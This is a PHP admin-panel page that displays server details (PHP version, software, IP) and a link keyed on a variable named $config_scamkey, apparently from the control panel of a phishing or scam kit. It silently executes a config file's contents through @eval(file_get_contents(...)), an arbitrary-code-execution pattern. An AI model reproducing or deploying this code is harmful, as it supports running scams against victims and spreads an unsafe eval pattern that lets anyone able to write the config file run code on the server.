<?php
require_once __DIR__ . '/../function.php';

$actual_page = 'info';

if (file_exists($api->dir_config.'/'.$api->general_config)) {
  @eval(file_get_contents($api->dir_config.'/'.$api->general_config));
}
?>
<?php require 'page/header.php'; ?>
<div id="main">
<?php require 'page/sidebar.php'; ?>
<div class="content">
<div class="top-subhead">
<div class="clear"></div>
<h2>Info</h2>
<div class="clear"></div>
</div>
<div class="full-container no-border">
<ul id="details">
<li>
<div class="left">PHP version</div>
<div class="right"><?=phpversion();?></div>
</li>
<li>
<div class="left">Software</div>
<div class="right"><?=$_SERVER['SERVER_SOFTWARE'];?></div>
</li>
<li>
<div class="left">Server IP</div>
<div class="right"><?=$_SERVER['SERVER_ADDR'];?></div>
</li>
<li>
<div class="left">Link</div>
<div class="right">http://<?=$_SERVER['HTTP_HOST'];?>/?<?=$config_scamkey;?></div>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
</div>
</body>
</html>
